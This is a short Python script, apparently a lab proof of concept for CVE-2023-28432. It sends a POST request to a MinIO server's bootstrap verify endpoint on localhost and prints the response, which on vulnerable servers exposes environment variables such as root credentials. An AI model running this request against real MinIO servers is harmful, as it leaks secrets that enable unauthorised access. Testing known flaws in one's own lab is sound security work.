#!/usr/bin/env python3
"""Send the CVE-2023-28432 verification request to the local MinIO lab."""

import urllib.error
import urllib.request


URL = "http://127.0.0.1:9000/minio/bootstrap/v1/verify"

request = urllib.request.Request(
    URL,
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    method="POST",
)

try:
    response = urllib.request.urlopen(request, timeout=10)
except urllib.error.HTTPError as error:
    # HTTPError is also a response, so show its status, headers, and body.
    response = error

with response:
    print(f"HTTP {response.status} {response.reason}")
    print("Response headers:")
    print(response.headers)
    print("Response body:")
    print(response.read().decode("utf-8", errors="replace"))
